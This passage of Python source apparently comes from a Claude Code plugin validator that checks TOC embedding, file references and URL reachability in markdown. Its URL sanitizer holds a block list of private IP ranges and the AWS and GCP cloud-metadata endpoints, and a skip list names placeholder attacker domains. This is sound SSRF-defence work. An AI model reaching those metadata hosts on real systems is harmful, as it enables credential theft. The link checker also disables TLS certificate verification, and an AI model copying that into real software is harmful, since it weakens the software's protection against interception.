                f"{embedded_count}/{len(toc_headings)} TOC headings embedded. "
                f"SKILL.md must copy the COMPLETE TOC of each referenced .md "
                f"file verbatim immediately after its link — no exceptions, "
                f"no summaries, no partial lists. Any missing TOC entry will "
                f"never be discovered by the progressive discovery algorithm "
                f"— that content becomes invisible to agents. Embed all "
                f"{len(toc_headings)} headings exactly as they appear in "
                f"'{ref_path.name}'. If the TOC is too long to embed, the "
                f"fix is in the reference file, NOT in SKILL.md: (1) drop "
                f"sections that are not worth discovering (then the TOC "
                f"shrinks naturally), or (2) merge granular subsections "
                f"into fewer, more encompassing headings (same coverage, "
                f"fewer entries). Either the content is worth discovering "
                f"(embed the full TOC) or it is not (remove it from the "
                f"reference file's TOC).",
                rel_file,
            )

    # --- Backtick reference detection ---
    # Build set of files already checked via proper markdown links to avoid
    # double-counting TOC embedding checks.
    already_checked_files: set[str] = set()
    for link_match in _MD_LINK_RE.finditer(md_content):
        link_target = link_match.group(2)
        ref_path = base_dir / link_target
        if not ref_path.is_file():
            ref_path = md_file_path.parent / link_target
        if ref_path.is_file():
            already_checked_files.add(str(ref_path.resolve()))

    for bt_match in _BACKTICK_REF_RE.finditer(md_content):
        bt_path_str = bt_match.group(1)

        # Issue #16 category C: skip npm-package shapes — `@scope/name`,
        # `name@version`, `id/version` are NOT filesystem paths.
        if is_npm_package_shape(bt_path_str):
            continue

        # Determine the line number of this backtick reference
        bt_start = bt_match.start()
        bt_line_num = md_content[:bt_start].count("\n")

        # Skip if inside a fenced code block
        if bt_line_num in fenced_lines:
            continue

        # Issue #16 category F: skip references that target a vendored
        # subtree (external/, vendor/, node_modules/, third_party/, …,
        # plus .gitmodules paths and per-plugin cpv.exclude_paths).
        if is_vendored_path(Path(bt_path_str), base_dir):
            continue

        # Resolve the referenced file path (same logic as markdown links)
        ref_path = base_dir / bt_path_str
        if not ref_path.is_file():
            ref_path = md_file_path.parent / bt_path_str
            if not ref_path.is_file():
                continue

        # Only validate .md files (already enforced by regex, but be safe)
        if ref_path.suffix.lower() != ".md":
            continue

        # Always report MINOR for the backtick format itself — backtick
        # references are invisible to the TOC embedding algorithm and
        # agents cannot discover the referenced content.
        report.minor(
            f"Reference to '{ref_path.name}' in {rel_file} uses backtick format (`{bt_path_str}`) instead of a markdown link. Use [{ref_path.stem}]({bt_path_str}) so progressive discovery can find it — backtick references are invisible to the TOC embedding algorithm.",
            rel_file,
        )

        # If this file was already checked via a proper markdown link,
        # skip the TOC embedding check (avoid double-counting)
        resolved = str(ref_path.resolve())
        if resolved in already_checked_files:
            continue

        # Read the referenced file and extract its TOC
        try:
            ref_content = ref_path.read_text(encoding="utf-8")
        except Exception:
            continue

        toc_headings = extract_toc_headings(ref_content)

        if not toc_headings:
            # No TOC in the backtick-referenced file — nothing more to check
            already_checked_files.add(resolved)
            continue

        refs_checked += 1

        # Check if TOC headings appear within ~50 lines after the backtick ref
        search_start = max(0, bt_line_num)
        search_end = min(len(lines), bt_line_num + 100)
        nearby_text = "\n".join(lines[search_start:search_end])

        nearby_lower_bt = nearby_text.lower()
        nearby_no_bt = nearby_lower_bt.replace("`", "")

        def _bt_heading_matches(heading: str) -> bool:
            h = heading.lower()
            return h in nearby_lower_bt or h.replace("`", "") in nearby_no_bt

        embedded_count = sum(1 for heading in toc_headings if _bt_heading_matches(heading))

        if embedded_count == len(toc_headings):
            refs_with_toc += 1
        else:
            # TOC not fully embedded — report missing embedding as separate MINOR
            report.minor(
                f"Backtick reference to '{ref_path.name}' in {rel_file} has "
                f"{embedded_count}/{len(toc_headings)} TOC headings embedded. "
                f"Convert to a markdown link and copy the COMPLETE TOC of the "
                f"referenced file verbatim immediately after the link — no "
                f"exceptions, no summaries, no partial lists. Any missing TOC "
                f"entry will never be discovered by the progressive discovery "
                f"algorithm — that content becomes invisible to agents. "
                f"Embed all {len(toc_headings)} headings exactly as they "
                f"appear in '{ref_path.name}'. If the TOC is too long to "
                f"embed, the fix is in the reference file, NOT in SKILL.md: "
                f"(1) drop sections that are not worth discovering (then the "
                f"TOC shrinks naturally), or (2) merge granular subsections "
                f"into fewer, more encompassing headings (same coverage, "
                f"fewer entries). Either the content is worth discovering "
                f"(embed the full TOC) or it is not (remove it from the "
                f"reference file's TOC).",
                rel_file,
            )

        # Track so we don't double-check if the same file appears again
        already_checked_files.add(resolved)

    if refs_checked > 0 and refs_with_toc == refs_checked:
        report.passed(
            f"All {refs_checked} referenced .md files have TOC embedded in {rel_file}",
            rel_file,
        )


def validate_md_file_paths(
    md_file: Path,
    plugin_root: Path,
    report: ValidationReport,
    *,
    skip_patterns: set[str] | None = None,
    is_reference_doc: bool = False,
) -> None:
    """Validate that file paths referenced in a markdown file exist on disk.

    Extracts paths from:
    1. Markdown links: [text](path) where path doesn't start with http/#
    2. Backtick references that look like file paths: `path/to/file.ext`
    3. Fenced code block references are SKIPPED (too many false positives)

    Paths are resolved relative to the .md file's parent directory first,
    then relative to plugin_root.

    Args:
        is_reference_doc: If True, this file is a reference/fix guide that
            describes the USER's plugin structure. Plugin-internal backtick
            paths are downgraded from MINOR to WARNING since they describe
            the target plugin, not this plugin.
    """
    try:
        content = md_file.read_text(encoding="utf-8")
    except Exception:
        return

    if skip_patterns is None:
        skip_patterns = set()

    rel_md = str(md_file.relative_to(plugin_root)) if md_file.is_relative_to(plugin_root) else md_file.name

    # Strip fenced code blocks to avoid false positives from example code
    # Match ```...``` blocks (including with language specifier)
    content_no_codeblocks = re.sub(r"```[\s\S]*?```", "", content)

    # 1. Extract markdown link targets: [text](path)
    # Skip: URLs (http/https/mailto), anchors (#), empty
    md_link_re = re.compile(r"\[(?:[^\]]*)\]\(([^)]+)\)")

    # 2. Extract backtick file path references: `path/to/file.ext`
    # Only match if it looks like a real file path (has extension or path separator)
    backtick_path_re = re.compile(r"(?<!`)``?([^`\n]+\.\w{1,10})``?(?!`)")

    checked_paths: set[str] = set()

    def _is_template_or_example_path(path: str) -> bool:
        """Return True if path looks like a documentation template/example, not a real reference."""
        # Template variables: {var}, <placeholder>, $VAR, YYYYMMDD
        if re.search(r"[{}<>]|\$\w|YYYY|placeholder|my-plugin|my-agent|my-skill|your-", path, re.IGNORECASE):
            return True
        # Glob patterns: *.md, **/*.py
        if "*" in path:
            return True
        # Regex-like patterns (contain special regex chars that aren't path chars)
        if re.search(r"[?!\\^|+\[\]]", path):
            return True
        # Shell commands: chmod, ls, cat, shellcheck, ruff, mypy, npx, etc.
        if re.match(
            r"^(chmod|ls|cat|mkdir|rm|cp|mv|git|uv|pip|npm|bun|curl|wget|shellcheck|ruff|mypy|npx|deno|node|python|python3)\s",
            path,
        ):
            return True
        # Paths starting with ~ (user home dir references in docs)
        if path.startswith("~"):
            return True
        # Generic example paths used in documentation (other-file, subfolder/file, docs_dev/, etc.)
        if re.match(r"^\.\./(other|example|some)", path) or re.match(
            r"^(subfolder|subdir|folder|other|docs_dev|scripts_dev|tests_dev)/", path
        ):
            return True
        # Example filenames commonly used in documentation (foo, bar, run, test, etc.)
        basename = path.rsplit("/", 1)[-1].split(".")[0] if "/" in path else ""
        if basename in ("foo", "bar", "baz", "run", "test", "example", "sample", "demo", "my", "your"):
            return True
        # Paths referencing common config files that may not exist in this plugin
        # but are referenced as documentation examples
        if re.match(r"^\.?/?\.(vscode|docker|github|claude)/", path) or re.match(
            r"^\./(vscode|docker|github|claude)/", path
        ):
            return True
        return False

    for match in md_link_re.finditer(content_no_codeblocks):
        raw_path = match.group(1).strip()
        # Skip URLs, anchors, mailto, data URIs
        if raw_path.startswith(("http://", "https://", "#", "mailto:", "data:", "tel:")):
            continue
        # Strip anchor from path (e.g., "file.md#section" -> "file.md")
        path_no_anchor = raw_path.split("#")[0].strip()
        if not path_no_anchor:
            continue
        # Skip template/example paths and caller-specified patterns
        if _is_template_or_example_path(path_no_anchor):
            continue
        if any(pat in path_no_anchor for pat in skip_patterns):
            continue
        if path_no_anchor in checked_paths:
            continue
        checked_paths.add(path_no_anchor)

        # Try resolving: first relative to .md file, then relative to plugin root
        resolved = md_file.parent / path_no_anchor
        if not resolved.exists():
            resolved = plugin_root / path_no_anchor
        if not resolved.exists():
            report.minor(
                f"Broken file reference: [{path_no_anchor}] in {rel_md} — "
                f"file not found. Two legitimate fixes: (1) if the "
                f"reference is meant to be real, create the missing file "
                f"or correct the path; (2) if it's a prose example/"
                f"placeholder, convert the path to a template-exempt "
                f"form the validator recognises — wrap in braces like "
                f"`{{path}}`, angle brackets like `<path>`, use a known "
                f"placeholder prefix (`my-`, `your-`, `foo`, `bar`, "
                f"`example`, `placeholder`), or put the whole snippet "
                f"inside a triple-backtick fenced code block (fenced "
                f"content is stripped before the broken-reference "
                f"check).",
                rel_md,
            )
        else:
            report.passed(
                f"File reference OK: {path_no_anchor} ({rel_md})",
                rel_md,
            )

    for match in backtick_path_re.finditer(content_no_codeblocks):
        raw_path = match.group(1).strip()
        # Only check paths that contain a directory separator (skip bare filenames
        # that are likely code identifiers like `json.loads` or `sys.argv`)
        if "/" not in raw_path and "\\" not in raw_path:
            continue
        # Skip URLs that somehow ended up in backticks
        if raw_path.startswith(("http://", "https://")):
            continue
        # Skip shell commands, env vars, flags
        if raw_path.startswith(("$", "--", "-")):
            continue
        # Skip template/example paths and caller-specified patterns
        if _is_template_or_example_path(raw_path):
            continue
        if any(pat in raw_path for pat in skip_patterns):
            continue
        if raw_path in checked_paths:
            continue
        checked_paths.add(raw_path)

        # Skip paths that contain spaces — likely error messages, not actual paths
        if " " in raw_path:
            continue
        # Skip absolute system paths used as examples in docs (e.g., /usr/local/bin/script.sh)
        if raw_path.startswith("/"):
            continue

        # Strip leading ./ properly (remove only the prefix "./" not individual chars)
        clean_path = raw_path
        while clean_path.startswith("./"):
            clean_path = clean_path[2:]

        # Skip paths under gitignored directories (runtime artifacts, dev folders)
        if any(clean_path.startswith(p) or f"/{p}" in clean_path for p in _GITIGNORED_DIR_PATTERNS):
            continue

        # Well-known plugin structure paths — standard paths every plugin doc references
        well_known_plugin_paths = {
            ".claude-plugin/plugin.json",
            ".claude-plugin/marketplace.json",
            "hooks/hooks.json",
            ".mcp.json",
            ".lsp.json",
            "settings.json",
        }
        if raw_path in well_known_plugin_paths or clean_path in well_known_plugin_paths:
            continue

        # Determine if this path looks like it references a file inside the plugin
        # (starts with a known plugin directory like scripts/, commands/, agents/,
        # skills/, references/, hooks/, or a plugin config file)
        plugin_internal_prefixes = (
            "scripts/",
            "commands/",
            "agents/",
            "skills/",
            "references/",
            "hooks/",
            "rules/",
            "templates/",
            "docs/",
            "docs_dev/",
            ".claude-plugin/",
            "claude-plugin/",
        )
        is_plugin_internal = clean_path.startswith(plugin_internal_prefixes)

        resolved = md_file.parent / clean_path
        if not resolved.exists():
            resolved = plugin_root / clean_path
        if resolved.exists():
            report.passed(
                f"Backtick path OK: `{raw_path}` ({rel_md})",
                rel_md,
            )
        elif is_reference_doc:
            # Reference/command docs describe the USER's plugin structure, not this plugin —
            # unresolved paths are expected and not a problem
            continue
        elif is_plugin_internal:
            # Path clearly references a plugin directory in a non-reference doc — real broken reference
            report.minor(
                f"Broken backtick path: `{raw_path}` in {rel_md} — file not found in plugin",
                rel_md,
            )
        else:
            # External or ambiguous path in non-reference doc — flag as warning (non-blocking)
            report.warning(
                f"Possible broken backtick path: `{raw_path}` in {rel_md}",
                rel_md,
            )


def _sanitize_url(url: str) -> str | None:
    """Sanitize a URL before making HTTP requests.

    Returns the sanitized URL, or None if the URL is unsafe.
    Prevents SSRF, command injection, and other URL-based attacks.
    """
    from urllib.parse import urlparse

    # Only allow http/https schemes — block file://, ftp://, javascript:, data:, etc.
    if not url.startswith(("http://", "https://")):
        return None

    try:
        parsed = urlparse(url)
    except Exception:
        return None

    # Must have a valid hostname
    if not parsed.hostname:
        return None

    host = parsed.hostname.lower()

    # Block private/internal IPs and localhost variants
    unsafe_hosts = {
        "localhost",
        "127.0.0.1",
        "0.0.0.0",
        "::1",
        "[::1]",
        "169.254.169.254",  # AWS metadata endpoint
        "metadata.google.internal",  # GCP metadata
    }
    if host in unsafe_hosts:
        return None

    # Block private IP ranges (10.x, 172.16-31.x, 192.168.x)
    import ipaddress

    try:
        ip = ipaddress.ip_address(host)
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
            return None
    except ValueError:
        pass  # Not an IP address — hostname is fine

    # Block URLs with credentials (user:pass@host)
    if parsed.username or parsed.password:
        return None

    # Block non-standard ports commonly used for internal services
    if parsed.port and parsed.port not in (80, 443, 8080, 8443):
        return None

    # Strip fragments — they're client-side only
    # Rebuild URL without fragment to avoid injection in fragment
    clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    if parsed.query:
        # Only allow simple query params (no nested URLs or shell chars)
        safe_query = re.sub(r"[;&|`$(){}]", "", parsed.query)
        if safe_query:
            clean += f"?{safe_query}"

    # Length limit — URLs over 2048 chars are suspicious
    if len(clean) > 2048:
        return None

    return clean


#: HTTP status codes that may clear up on retry (transient upstream state).
#  Used by validate_md_urls() to distinguish real dead URLs from flaky ones.
#  408=Request Timeout, 425=Too Early, 429=Too Many Requests,
#  500=Internal Server Error, 502=Bad Gateway, 503=Service Unavailable,
#  504=Gateway Timeout.
_TRANSIENT_HTTP_CODES: frozenset[int] = frozenset({408, 425, 429, 500, 502, 503, 504})

#: Hosts that aggressively throttle anonymous HEAD requests from one IP.
#  github.com SYN-resets parallel HEADs when several arrive simultaneously,
#  producing the false-positive "Dead URL (unreachable)" reported in issues
#  #12 and #13. Cap per-host concurrency to 2 to avoid the reset.
_STRICT_HOST_CONCURRENCY: dict[str, int] = {
    "github.com": 2,
    "www.github.com": 2,
    "api.github.com": 2,
    "raw.githubusercontent.com": 2,
    "gist.github.com": 2,
    "codeload.github.com": 2,
}

#: Default per-host cap for hosts not listed in _STRICT_HOST_CONCURRENCY.
#  Still prevents a single upstream from seeing 16 parallel HEADs.
_DEFAULT_PER_HOST_CONCURRENCY: int = 4

#: Per-host transient-error retry budget. github.com sometimes returns
#  socket timeouts under burst load even when the URL is healthy; bumping
#  the retry budget for github-family hosts mirrors the spirit of the
#  github-timeouts rule (be patient with transient failures) without
#  bloating the runtime of `--strict` scans of arbitrary external URLs.
#
#  Counts are EXTRA attempts beyond the function's `max_retries` param —
#  so an entry of 2 means github.com gets +2 attempts compared to the
#  default. Total cap: max_retries + extra + 1 attempts.
_HOST_TRANSIENT_RETRY_BONUS: dict[str, int] = {
    "github.com": 2,
    "www.github.com": 2,
    "api.github.com": 2,
    "raw.githubusercontent.com": 2,
    "gist.github.com": 2,
    "codeload.github.com": 2,
    "objects.githubusercontent.com": 2,
}

#: Per-host linear-backoff multiplier (seconds added per retry attempt) —
#  longer than the default 0.4 so github.com doesn't get hammered while
#  it's actively rate-limiting us.
_HOST_RETRY_BACKOFF: dict[str, float] = {
    "github.com": 1.5,
    "www.github.com": 1.5,
    "api.github.com": 1.5,
    "raw.githubusercontent.com": 1.5,
    "gist.github.com": 1.5,
    "codeload.github.com": 1.5,
    "objects.githubusercontent.com": 1.5,
}


def _is_transient_url_error(exc: BaseException | None) -> bool:
    """True if `exc` is a network error that may clear up on retry.

    Covers: socket/TimeoutError, ssl.SSLError, connection resets,
    http.client.RemoteDisconnected/BadStatusLine, and URLError that
    wraps any of the above. Permanent errors (DNS NXDOMAIN,
    ConnectionRefused to a dead host) return False.
    """
    if exc is None:
        return False

    import socket
    import ssl
    import urllib.error
    from http.client import BadStatusLine, RemoteDisconnected

    if isinstance(exc, (socket.timeout, TimeoutError)):
        return True
    if isinstance(exc, ssl.SSLError):
        return True
    if isinstance(exc, (RemoteDisconnected, BadStatusLine)):
        return True
    if isinstance(exc, ConnectionResetError):
        return True
    if isinstance(exc, urllib.error.HTTPError):
        return exc.code in _TRANSIENT_HTTP_CODES
    if isinstance(exc, urllib.error.URLError):
        # Peek at the wrapped reason — that's where the actionable info lives.
        return _is_transient_url_error(getattr(exc, "reason", None))
    return False


def _format_url_exception(exc: BaseException | None) -> str:
    """Render a short, filesystem-safe one-line summary of `exc` for a WARNING.

    Keeps the exception type name and (when helpful) the wrapped reason
    type or a trimmed str(e). Avoids dumping stack traces into reports.
    """
    if exc is None:
        return "unreachable"

    import urllib.error

    name = type(exc).__name__
    if isinstance(exc, urllib.error.URLError):
        reason = getattr(exc, "reason", None)
        if reason is not None and not isinstance(reason, str):
            return f"{name}: {type(reason).__name__}"
        if isinstance(reason, str) and reason:
            return f"{name}: {reason[:80]}"
        return name

    msg = str(exc)
    if msg and len(msg) <= 80:
        return f"{name}: {msg}"
    return name


def validate_md_urls(
    md_file: Path,
    plugin_root: Path,
    report: ValidationReport,
    *,
    timeout: float = 8.0,
    skip_domains: set[str] | None = None,
    url_cache: dict[str, bool] | None = None,
    max_retries: int = 2,
    retry_backoff: float = 0.4,
) -> None:
    """Validate that URLs referenced in a markdown file are reachable.

    Extracts URLs from markdown links [text](url) and bare URLs in text.
    Does HTTP HEAD requests with timeout. Reports dead URLs as WARNING.

    Uses a cache dict (shared across calls) to avoid re-checking the same URL.
    All URLs are sanitized before any network request is made.

    Reachability strategy (issues #12, #13 — GitHub false-positive fix):

    1. **Per-host concurrency cap**: github.com and its sibling hosts rate-limit
       parallel anonymous HEAD requests from a single IP. Each host gets a
       semaphore (cap 2 for strict hosts, 4 otherwise) so concurrent HEADs
       against the same upstream never exceed the safe ceiling.
    2. **Retry on transient**: network timeouts, SSL handshake failures,
       RemoteDisconnected, and 429/503 HTTP codes are retried up to
       `max_retries` times with linear backoff (`retry_backoff` seconds
       per attempt). A genuinely dead URL stays dead across all retries.
    3. **HEAD → GET fallback**: the first retry uses GET instead of HEAD.
       Some CDNs (and occasionally GitHub) silently drop HEAD requests but
       serve GET cleanly.
    4. **Exception surfacing**: the WARNING now includes the exception type
       (and wrapped reason, when present) so users can distinguish a real
       DNS failure from a transient `socket.timeout`.
    5. **Env opt-out**: setting `CPV_SKIP_URL_CHECK=1` short-circuits the
       function — useful for air-gapped networks and release pipelines
       that treat WARNINGs as blocking.
    """
    import os
    import ssl
    import threading
    import time
    import urllib.error
    import urllib.request
    from concurrent.futures import ThreadPoolExecutor
    from urllib.parse import urlparse

    # Escape hatch for air-gapped environments and CI/CD pipelines that
    # can't afford false-positive WARNINGs. See issues #12, #13.
    if os.environ.get("CPV_SKIP_URL_CHECK") in ("1", "true", "yes", "on"):
        return

    try:
        content = md_file.read_text(encoding="utf-8")
    except Exception:
        return

    # Fresh-scaffold special case: when validating a brand-new plugin that
    # has not yet been pushed to GitHub (no `.git/` dir AND no `origin`
    # remote), the plugin's OWN homepage/repository URLs are guaranteed
    # to 404 until the first push. Adding them to skip_domains here keeps
    # the slurp/scaffold workflow noise-free without weakening dead-URL
    # checks for shipped plugins.
    own_urls_to_skip: set[str] = set()
    git_dir = plugin_root / ".git"
    if not git_dir.exists():
        plugin_json = plugin_root / ".claude-plugin" / "plugin.json"
        if plugin_json.is_file():
            try:
                manifest = json.loads(plugin_json.read_text(encoding="utf-8"))
                for key in ("homepage", "repository"):
                    val = manifest.get(key)
                    if isinstance(val, str) and val.startswith(("http://", "https://")):
                        # Strip trailing slash for matching
                        own_urls_to_skip.add(val.rstrip("/"))
            except (OSError, json.JSONDecodeError):
                pass

    if skip_domains is None:
        # Domains to skip: localhost, example domains, local IPs, placeholders
        skip_domains = {
            "localhost",
            "127.0.0.1",
            "0.0.0.0",
            "example.com",
            "example.org",
            "example.net",
            "evil.com",
            "attacker.com",
            "malicious.com",  # Security documentation examples
            "placeholder",
            "your-",
        }

    if url_cache is None:
        url_cache = {}

    rel_md = str(md_file.relative_to(plugin_root)) if md_file.is_relative_to(plugin_root) else md_file.name

    # Strip fenced code blocks — URLs in code examples shouldn't be validated
    content_no_codeblocks = re.sub(r"```[\s\S]*?```", "", content)

    # Extract URLs from markdown links AND bare URLs.
    # NOTE: backtick (`) is in the stop-set so URLs wrapped in inline code
    # like `` `https://example.com/path` `` capture cleanly without dragging
    # the closing backtick + adjacent punctuation into the match. Without
    # this, the input "Do not include `https://github.com/`," produced a
    # URL of "https://github.com/`," which the trailing-punctuation strip
    # reduced to bare "https://github.com/" — a meaningless homepage probe
    # that occasionally rate-limits and surfaced as a false-positive
    # "Dead URL" WARNING (issue: dead-URL false-positives, 2026-05-09).
    url_re = re.compile(r"https?://[^\s\)\]\"'<>`]+")

    # Create SSL context once, outside the loop
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    checked_urls: set[str] = set()

    # Two-phase scan (v2.26.0 — URL checks are now parallelized).
    #
    # Before v2.26.0 the loop ran one HEAD request at a time with an 8s
    # timeout, so a file with N unreachable URLs spent ~8N seconds in
    # IO wait. This dominated `validate_plugin.py --strict` runtime on
    # any plugin that referenced a few dead or slow links.
    #
    # Phase 1 — collect the (raw_url, safe_url) pairs we actually need
    # to hit the network for, plus any cache-hit results we can report
    # immediately. Phase 2 — dispatch the remainder to a thread pool
    # and drain results.
    to_check: list[tuple[str, str]] = []  # (raw_url, safe_url)

    for match in url_re.finditer(content_no_codeblocks):
        raw_url = match.group(0).rstrip(".,;:!?)`")  # Strip trailing punctuation and backticks

        if raw_url in checked_urls:
            continue
        checked_urls.add(raw_url)

        # Skip malformed/truncated URLs (bare protocol, too short to be real)
        if len(raw_url) < 12 or raw_url in ("http://", "https://", "http://`", "https://`"):
            continue
        # Skip template URLs with placeholders, generic owner/repo patterns, and ellipsis
        if re.search(
            r"[{}<>]|\$\w|placeholder|your-|example\.com|/owner/|/OWNER/|/user/|/USER/|\.\.\.", raw_url, re.IGNORECASE
        ):
            continue

        # Skip known-skippable domains before sanitization
        try:
            parsed = urlparse(raw_url)
            host = parsed.hostname or ""
            if any(skip in host for skip in skip_domains):
                continue
            # Skip bare-host URLs (path empty or "/" — i.e. just the
            # homepage). These are usually parser artefacts ("see github.com")
            # not real link checks, AND popular hosts (github.com, gitlab.com)
            # rate-limit homepage HEADs aggressively, producing false-positive
            # "Dead URL: https://github.com/" WARNINGs in CPV's own self-scan
            # that confuse newcomers. A genuine link to a homepage will still
            # resolve at scaffold time when a writer expands a placeholder.
            if parsed.path in ("", "/"):
                continue
        except Exception:
            continue

        # Skip the plugin's own homepage/repository URLs when no .git/ exists
        # yet (fresh scaffold — URLs would 404 until first push).
        if own_urls_to_skip:
            stripped = raw_url.rstrip("/")
            if any(stripped == own or stripped.startswith(own + "/") for own in own_urls_to_skip):
                continue

        # Sanitize URL before any network request
        safe_url = _sanitize_url(raw_url)
        if safe_url is None:
            continue  # Silently skip unsafe URLs (internal IPs, credentials, etc.)

        # Cache hit — report immediately, skip the network
        if safe_url in url_cache:
            if not url_cache[safe_url]:
                report.warning(f"Dead URL: {raw_url} in {rel_md}", rel_md)
            continue

        to_check.append((raw_url, safe_url))

    if not to_check:
        return

    # Per-host semaphores. Scoped to this call so each validate_md_urls()
    # invocation is isolated — no surprise throttling carried between
    # markdown files or plugin runs. The cache is keyed by hostname so
    # all URLs against the same host share a single semaphore.
    sem_cache: dict[str, threading.Semaphore] = {}
    sem_cache_lock = threading.Lock()

    def _sem_for(host: str) -> threading.Semaphore:
        with sem_cache_lock:
            sem = sem_cache.get(host)
            if sem is None:
                cap = _STRICT_HOST_CONCURRENCY.get(host, _DEFAULT_PER_HOST_CONCURRENCY)
                sem = threading.Semaphore(cap)
                sem_cache[host] = sem
            return sem

    def _one_request(url: str, method: str) -> tuple[int | None, BaseException | None]:
        """Single HEAD/GET. Returns (status_code, exc).

        Exactly one of status_code / exc is non-None.
        - HTTPError becomes (code, None) since GitHub-style 401/403/405
          carry useful information — we don't need the exception object.
        - Other exceptions (timeouts, connection resets, etc.) become
          (None, exc) so the caller can decide whether to retry.
        """
        try:
            req = urllib.request.Request(url, method=method)
            # Issue #16 category G: Google Fonts (and a few other CDNs)
            # gate by User-Agent; an obviously-bot UA gets HTTP 400 even
            # when the resource exists. A full browser-shaped UA gets 200.
            # We intentionally identify as a real Chrome to maximise
            # compatibility while keeping an "AppleWebKit/CPV-link" trail
            # in server logs for sysadmins who want to filter our traffic.
            req.add_header(
                "User-Agent",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/121.0.0.0 Safari/537.36 CPV-LinkChecker/1.0",
            )
            req.add_header(
                "Accept",
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            )
            req.add_header("Accept-Language", "en-US,en;q=0.5")
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                return (resp.status, None)
        except urllib.error.HTTPError as e:
            return (e.code, None)
        except BaseException as e:  # noqa: BLE001 — return exception to caller
            return (None, e)

    def _check_one(pair: tuple[str, str]) -> tuple[str, str, bool, str | None]:
        """Returns (raw_url, safe_url, is_alive, warning_suffix_or_None).

        Retry loop: up to `max_retries + bonus + 1` attempts total. First
        attempt uses HEAD; subsequent attempts use GET (HEAD-drop-on-CDN
        fallback). Only transient errors (_is_transient_url_error /
        _TRANSIENT_HTTP_CODES) trigger retry — a confirmed 404 returns
        immediately.

        Per-host retry budget bumped via `_HOST_TRANSIENT_RETRY_BONUS` so
        github.com (the host most likely to throttle anonymous HEADs)
        gets extra patience without slowing scans of arbitrary URLs.
        """
        raw_url, safe_url = pair
        host = (urlparse(safe_url).hostname or "").lower()
        sem = _sem_for(host)

        last_suffix = "unreachable"

        # Per-host retry tuning (github-timeouts-rule semantics).
        host_attempts = max_retries + _HOST_TRANSIENT_RETRY_BONUS.get(host, 0)
        host_backoff = _HOST_RETRY_BACKOFF.get(host, retry_backoff)
        backoff_cap = max(1.5, host_backoff * 4)

        for attempt in range(host_attempts + 1):
            if attempt > 0:
                # Linear backoff — capped so no single dead URL stretches
                # `--strict` runtime past a sane upper bound.
                time.sleep(min(backoff_cap, host_backoff * attempt))

            with sem:
                # First attempt: HEAD (cheap). On retry, switch to GET
                # because some CDNs (and occasionally GitHub) drop HEAD.
                method = "HEAD" if attempt == 0 else "GET"
                code, exc = _one_request(safe_url, method)

                # Classic 405 Method Not Allowed → always GET.
                if code == 405:
                    code, exc = _one_request(safe_url, "GET")

            # Evaluate outside semaphore so the retry sleep doesn't hold it.
            if code is not None:
                if code in (401, 403):
                    # Auth-protected — the URL exists, just not anonymously readable.
                    return (raw_url, safe_url, True, None)
                if code < 400:
                    return (raw_url, safe_url, True, None)
                # Error status. Retry if transient; otherwise it's dead.
                last_suffix = f"HTTP {code}"
                if code not in _TRANSIENT_HTTP_CODES or attempt >= host_attempts:
                    return (raw_url, safe_url, False, last_suffix)
                # Transient → fall through to retry.
                continue

            # Network-level exception. Surface the type so users can tell
            # a DNS failure from a socket.timeout.
            last_suffix = f"unreachable: {_format_url_exception(exc)}"
            if not _is_transient_url_error(exc) or attempt >= host_attempts:
                return (raw_url, safe_url, False, last_suffix)
            # Transient → fall through to retry.

        return (raw_url, safe_url, False, last_suffix)

    # Bounded worker pool: each worker may block up to `timeout` seconds on
    # a slow URL, so wall-clock time is approximately
    #   ceil(len(to_check) / max_workers) * worst-case-timeout
    # 16 workers is a comfortable pool size; the per-host semaphores above
    # prevent any single upstream from seeing all 16 at once.
    max_workers = min(16, max(1, len(to_check)))
    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        for raw_url, safe_url, is_alive, suffix in pool.map(_check_one, to_check):
            url_cache[safe_url] = is_alive
            if not is_alive:
                label = f"Dead URL ({suffix})" if suffix else "Dead URL"
                report.warning(f"{label}: {raw_url} in {rel_md}", rel_md)
